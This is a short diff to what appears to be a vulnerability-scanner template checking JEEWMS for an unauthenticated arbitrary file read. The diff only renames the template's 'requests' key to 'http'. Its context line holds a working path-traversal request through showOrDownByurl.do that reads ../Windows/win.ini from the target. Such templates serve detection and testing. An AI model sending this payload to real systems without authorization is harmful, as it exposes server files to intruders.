@@ -7,7 +7,7 @@ info:
   reference: https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/JEEWMS%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
   tags: JEEWMS,fileRead
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini"
